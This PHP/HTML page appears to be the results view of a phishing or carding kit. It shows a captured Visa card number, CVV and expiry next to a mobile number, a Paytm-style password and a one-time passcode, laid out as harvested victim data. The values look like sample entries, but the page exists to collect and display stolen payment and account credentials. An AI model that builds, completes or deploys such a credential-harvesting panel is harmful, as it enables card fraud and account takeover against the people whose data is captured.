<?php
include("../db.php");
?>
<!DOCTYPE html>
<html dir="ltr" lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title><?php echo $web_name; ?></title>
    <link rel="stylesheet" href="<?php echo $base_url; ?>/assets/css/bootstrap.min.css">
</head>

<body>

    <div class="preloader">
        <div class="lds-ripple">
            <div class="lds-pos"></div>
            <div class="lds-pos"></div>
        </div>
    </div>

    <div class="row">
        <div class="col-sm-6 mt-3">
            <div>
                <div class="card cardhov" style="background: rgba(0, 0, 0, 0) url(&quot;&quot;) repeat scroll 0% 0%;">
                    <div class="card-header" style="margin: 0px;text-align: center;">
                        <h4>Visa</h4>
                    </div>
                    <div class="card-body">
                        <div class="form-group" style=" border-bottom: 1px solid; "> <label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">Card Number : </label>
                            <div class="flag-n res_div" active_taba>4749 9274 2087 4218 </div>
                        </div>
                        <div class="form-group" style=" border-bottom: 1px solid; "> <label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">CVV : </label>
                            <div class="flag-n res_div" active_taba>123</div>
                        </div>
                        <div class="form-group" style="border-bottom: 1px solid;"><label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">Card Expiry: </label>
                            <div class="flag-n res_div" active_taba>01/24</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>


        <div class="col-sm-6 mt-3">
            <div>
                <div class="card cardhov" style="background: rgba(0, 0, 0, 0) url(&quot;&quot;) repeat scroll 0% 0%;">
                    <div class="card-header" style="margin: 0px;text-align: center;">
                        <h4>Mobile Number</h4>
                    </div>
                    <div class="card-body">
                        <div class="form-group" style=" border-bottom: 1px solid; "> <label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">Mobile Number : </label>
                            <div class="flag-n res_div" active_taba>77777 77777</div>
                        </div>
                        <div class="form-group" style=" border-bottom: 1px solid; "> <label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">Password : </label>
                            <div class="flag-n res_div" active_taba>Paytm12345</div>
                        </div>
                        <div class="form-group" style="border-bottom: 1px solid;"><label style="text-align: left;letter-spacing: 0px;color: #6B6B6B;opacity: 1;">OTP: </label>
                            <div class="flag-n res_div" active_taba>489871</div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

    </div>

</body>

</html>